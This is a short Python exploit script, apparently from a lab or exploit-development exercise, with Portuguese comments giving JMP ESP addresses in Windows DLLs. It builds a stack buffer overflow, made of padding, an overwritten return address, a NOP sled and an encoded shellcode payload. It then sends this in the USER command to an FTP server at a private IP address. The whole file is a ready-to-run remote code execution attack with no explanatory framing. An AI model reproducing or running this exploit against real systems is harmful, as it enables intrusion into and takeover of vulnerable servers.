#!/usr/bin/python
import socket

# Endereco para JMP ESP em user32.dll - 7E379353
# Endere√ßo para JMP ESP em mfc42.dll - 7C86467B
buf = (b"A" * 485 + b"\x7b\x46\x86\x7c" + b"\x90"*9)
buf += b"\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xf5\xb6\x3e\xa8\x83\xee\xfc\xe2\xf4"
buf += b"\x09\x5e\xb1\xa8\xf5\xb6\x5e\x21\x10\x87\xec\xcc"
buf += b"\x7e\xe4\x0e\x23\xa7\xba\xb5\xfa\xe1\x3d\x4c\x80"
buf += b"\xc4\x49\x31\x1f\xbf\x90\x0f\x68\x59\x8a\x5f\xd4"
buf += b"\xf7\x9a\x1e\x69\x3a\xbb\x3f\x6f\xbc\xc3\xd1\xfa"
buf += b"\xa2\x3d\x6c\xb8\x7e\xf4\x02\xa9\x25\x3d\x7e\xd0"
buf += b"\x70\x76\x4a\xe4\xf4\x66\x6e\x23\xbd\xae\xb5\xf0"
buf += b"\xd5\xb7\xed\x2d\x3c\xc2\x02\x99\x0a\xff\xb5\x9c"
buf += b"\x7e\xb7\xe8\x99\x35\x77\xf1\xa5\x59\xb7\xf9\x90"
buf += b"\x15\xc3\xca\xab\x88\x4e\x05\xd5\xd1\xc3\xde\xf0"
buf += b"\x7e\xee\x1a\xa9\x26\xd0\xb5\xa4\xbe\x3d\x66\xb4"
buf += b"\xf4\x65\xb5\xac\x7e\xb7\xee\x21\xb1\x92\x1a\xf3"
buf += b"\xae\xd7\x67\xf2\xa4\x49\xde\xf0\xaa\xec\xb5\xba"
buf += b"\x1c\x36\xc1\x57\x0a\xeb\x56\x9b\xc7\xb6\x3e\xc0"
buf += b"\x82\xc5\x0c\xf7\xa1\xde\x72\xdf\xd3\xb1\xc1\x7d"
buf += b"\x4d\x26\x3f\xa8\xf5\x9f\xfa\xfc\xa5\xde\x17\x28"
buf += b"\x9e\xb6\xc1\x7d\x9f\xbd\x67\xf8\x17\x4b\x54\xa9"
buf += b"\x9f\xb4\x56\x42\xfa\x69\xde\x57\x20\x21\x56\xaa"
buf += b"\xf5\xa7\x62\x21\x13\xdc\x2e\xfe\xa2\xde\xfc\x73"
buf += b"\xc2\xd1\xc1\x7d\x70\x76\x31\x2d\xad\xb6\x3e\xa8"
buf += b"\xa2\xde\x89\x41\xcd\x49\xc1\x7d\xa2\xde\x4a\x44"
buf += b"\xce\x57\xc1\x7d\xa2\x21\x56\xdd\x9b\xfb\x5f\x57"
buf += b"\x20\xdc\x3e\xc2\xf1\xe0\x69\xc0\xf7\x6f\xf6\xf7"
buf += b"\x0a\x63\xbd\x50\xf5\xc8\x13\x23\xc3\xdc\x7e\xc0"
buf += b"\xf5\xa6\x3e\xa8\xa3\xdc\x3e\xc0\xad\x12\x6d\x4d"
buf += b"\x0a\x63\xad\xfb\x9f\xb6\x68\xfb\xa2\xde\x3c\x71"
buf += b"\x3d\xe9\xc1\x7d\x76\x4e\x3e\xd6\xf2\xb7\xfd\x81"
buf += b"\x33\xc3\xd7\x6b\x4e\x46\x8b\x0a\xa3\xdc\x3e\xfb"
buf += b"\x0a\x63\x3e\xa8"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.50.102", 21))
s.send(b"USER " + buf + b" \r\n")
